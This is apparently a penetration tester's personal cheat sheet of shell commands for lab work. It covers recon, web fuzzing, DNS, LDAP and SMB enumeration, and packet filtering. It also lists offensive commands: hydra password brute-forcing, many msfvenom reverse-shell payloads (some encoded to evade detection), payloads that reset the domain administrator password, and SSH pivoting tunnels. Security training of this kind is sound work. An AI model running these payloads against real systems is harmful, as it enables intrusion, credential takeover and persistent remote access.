#### helpful links
- https://viperone.gitbook.io/pentest-everything/
- https://kashz.gitbook.io/kashz-jewels/
- https://sushant747.gitbooks.io/total-oscp-guide/content/the_basics.html


# simplified initial recon
```bash
sudo $(which autorecon) $(cat ip) -v --single-target --heartbeat 10 --dirbuster.wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt && sudo mv results/scans . && sudo mv results/report . && sudo rm -r results && sudo mv report/report.md/$(cat ip) . && sudo rm -r report

sudo nmap -sV -sC -p- -vvv -oA nmap/initial $(cat ip)

nikto -host http://$(cat ip)
dirb http://$(cat ip):8080 -w

sudo nmap -vv --reason -Pn -T4 -sV -p 8080 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oA nmap/tcp_8080 $(cat ip)


wget --accept '*.php' --reject-regex '/\?C=[A-Z];O=[A-Z]$' --execute robots=off --recursive --level=0 --no-parent --spider 'http://slort.local:8080/dashboard/docs/ ' 2>&1 | tee main.log
```


#---------------------------- READ FILE WITHOUT CAT ----------------------------#
```bash
while read line; do echo $line; done < file.txt
echo "$(<file.txt)"

```

# scanning
```bash
sudo nmap -vvv -sV -sC --top-ports 5000 -oA nmap/5000 
sudo nmap --vvv sV -sC --top-ports 100 -oA nmap/100 
sudo nmap -vvv -sV -sU --top-ports 50 nmap/udp
sudo nmap -vvv --script='vuln,banner' -sC -sV -oA nmap/bannervuln 
sudo python3 autorecon.py
```

# web
https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files

```bash
nikto -C all -host http://$IP:$PORT -o nikto.out
wfuzz -v -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  --hc 404 -u http://$IP:$PORT/FUZZ -R2
wfuzz --hc 404 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt http://192.168.55.122/FUZZ

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 1000 -u http:/$IP:$PORT/FUZZ -recursion --recursion-depth 3 -c -v -o ffuf.out
dirsearch -u http://$(cat ip):$port -r -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o $(pwd)/dirsearch.txt
dirsearch -e php,html,js -u http://$IP:$PORT -r
gobuster dir --url http://$IP:$PORT../.. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.aspx -o gobuster.out
dirb http://$IP:$PORT/ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o dirb.txt
hydra -l root -P /usr/share/wordlists/rockyou.txt  $(cat ip) http-get-form "/db/login.php:HOST=localhost&USER=root&PASS=^PASS^&DATABASE=username=root&password=^PASS^&&js_autodetect_results=1&just_logged_in=1:F=" -V
```


# other
```bash
axel -a -n 20 -o  https://www.exploit-db.com/raw/50706 -o 50706.axel
BloodHound --no-sandbox
crackmapexec smb 192.168.188.99 --shares
curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')" http://$IProbots.txt
diff -u scans/$IP_scan_01.txt scans/$IP_scan_02.txt

dig domain.com ALL
dig domain.com spf
dig domain.com TXT
dig TXT domain.com _dmarc.domain.com
dig TXT domain.com _spf.domain.com



dnsenum megabank.local
dnsenum domain.com
dnsenum domain.com
dnsrecon -d blackfield.local
dnsrecon -d megabank.local -t axfr
dnsrecon -d domain.com -t axfr




grep -rnw . -e 'pass'
grep -rnw . -e 'password'
grep -rnw . -e 'user'

host -a domain.com
host -A domain.com
host -h
host domain.com
host -t all domain.com
host -t -a domain.com
host -t DMARC domain.com
host -t ns domain.com
host -t spf domain.com
host -t txt domain.com


ldapsearch -h $IP -x -b base
ldapsearch -h $IP -x -b 'DC=domain,DC=com'
ldapsearch -h $IP -x -b 'DC=domain,DC=com' '(objectclass=user)'
ldapsearch -h $IP -x -s base
ldapsearch -h $IP -x -s base > ldap1.out
ldapsearch -h $IP -x -s 'DC=domain,DC=com'
ldapsearch -h $IP -x -b "DC=master,DC=domain,DC=local"
ldapsearch -h $IP -x -b "DC=domain,DC=local"
ldapsearch -h $IP -x -b "DC=domain,DC=local" "(objectclass=person)"
ldapsearch -h $IP -x -b "DC=domain,DC=local" "(objectclass=user)"
ldapsearch -h $IP -x -s base



msf-nasm_shell
msf-pattern_create -l 4379
msf-pattern_create -l 800
msf-pattern_offset -l 800 -q 42306142
msf-pattern_offset -q 46367046

msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f hta-psh -o msfv.hta
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 -f hta-psh -o hello.hta
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f wq
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=80 -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.188 LPORT=80 -f exe > shell.exe
msfvenom -p windows/x64/exec cmd='net user administrator P@assword123! /domain' -f exe > hello.exe
msfvenom -p windows/x64/exec cmd='net user Administrator P@ssword123!! /domain' -f dll > df.dll
msfvenom -p windows/x64/shell_reverse_tcp -f dll lhost=$IP lport=443 -o df.dll
msfvenom -p windows/x64/shell_reverse_tcp -f dll lhost=$IP lport=4444 -o df.dll --platform=windows
msfvenom -p windows/x64/shell_reverse_tcp -f dll lhost=$IP lport=444 -o plugin.dll
msfvenom -p windows/x64/shell_reverse_tcp -f dll lhost=$IP lport=813 -o plugin.dll
msfvenom -p windows/x64/shell_reverse_tcp lhost=$IP lport=1234 -f dll -o df.dll
msfvenom -p windows/x64/shell_reverse_tcp lhost=$IP -lport=1234 -f dll -o df.dll
msfvenom -p windows/x64/shell_reverse_tcp lhost=$IP lport=1234 -f dll -o df.dll --encoder x86/shikata_ga_na
msfvenom -p windows/x64/shell_reverse_tcp lhost=$IP lport=1234 -f dll -o df.dll -e x86/shikata_ga_na
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f dll -o rev.dll
mv * domain
netstat -ano
netstat -antup
netstat -tlpen
ngrep -i -d tun0 port 139
ngrep -i -d tun0 ‘s.?a.?m.?b.?a.*[[:digit:]]’ && smbclient -L //$IP
nikto -host http://$IP:47001/
nikto -host http://$IP:47001/ -C all
nikto -host http://192.168.188.99:33333 -C all
nmap -sT -A --top-ports=100 $IP54 -oA nmap/top-ports-100.txt
openssl passwd helloworld
ps aux
ps aux | grep -i firefox | grep -v parent

rpcclient -U "" -N $IP
rpcclient -U "" -N $IP --no-pass
rpcclient -U "" -N $IP --no-pass

smbclient //$IP/IPC$\ Share -U '' -P ''
smbclient //$IP/IPC$ -U '' --option='client min protocol=NT1'
smbclient \\\\$IP\\SusieShare
smbclient -L \\\\$IP
smbclient -L \\\\$IP\\IPC$
smbclient -L \\\\$IP
smbmap -H $IP -u ''


ssh j0hn@$IP -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22000
ssh j0hn@$IP -p 22000
ssh -N -D 127.0.0.1:8130 j0hn@$IP -oKexAlgorithms=+diffie-hellman-group1-sha1 -vv -p 22000
    -oHostKeyAlgorithms=+ssh-dss
ssh -N -D 127.0.0.1:9050 j0hn@$IP -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22000
ssh -N -D 127.0.0.1:9050 sean@$IP
ssh -N -L 0.0.0.0:1337:127.0.0.1:14147 ariah@192.168.188.99
ssh -N -L 0.0.0.0:8133:127.0.0.1:14147 ariah@192.168.188.99
ssh -R 8133:127.0.0.1:14147 ariah@192.168.188.99

tar xvfz scans.tar.gz

tcpdump -h | grep -i tcpflags
tcpdump -i tun0
tcpdump 'tcp[13] == 2 or tcp[13] == 16' -r file.pcap
tcpdump 'tcp[13] & 4 != 0 or tcp[13] & 16 != 0 or tcp[13] & 2 != 0' -r file.pcap
tcpdump 'tcp[13] & 8 != 0 or tcp[13] & 16 != 0' -r file.pcap 
tcpdump 'tcp[13] & 8 != 0' -r file.pcap 
tcpdump '(tcp-ack|tcp-psh) != 0' -r file.pcap
tcpdump '(tcp-ack|tcp-psh)==(tcp-ack|tcp-psh)' -r file.pcap
tcpdump 'tcp[tcpflags] & (tcp-ack|tcp-psh) != 0' -r file.pcap 
tcpdump 'tcp[tcpflags] & (tcp-ack|tcp-psh) == (tcp-ack|tcp-psh)' -r file.pcap 
tcpdump 'tcp[tcpflags] & (tcp-ack|tcp-push) == (tcp-ack|tcp-push)' -r file.pcap 
tcpdump 'tcp[tcpflags] & (tcp-rst|tcp-ack) == (tcp-rst|tcp-ack)' -r  file.pcap

theHarvester -d domain.com -l 100 -b bing
theHarvester -d domain.com -l 100 -b bing,google,linkedin,urlscan
theHarvester -d domain.com -l 100 -b google
theharvester -d domain.com -l 500 -b google
theHarvester -d domain.com -l 500 -b google


watch -n 1 w 
watch -n 1 w /var/log/apache2/access.log
watch "ps aux | sort -nrk 3,3 | head -n 10"
watch "ps aux | sort -nrk 3,3 | head -n 15"
watch "ps aux | sort -nrk 3,3 | head -n 5"
watch "ps --sort=-pcpu | sort -nrk 3,3 | head -n 10"
```





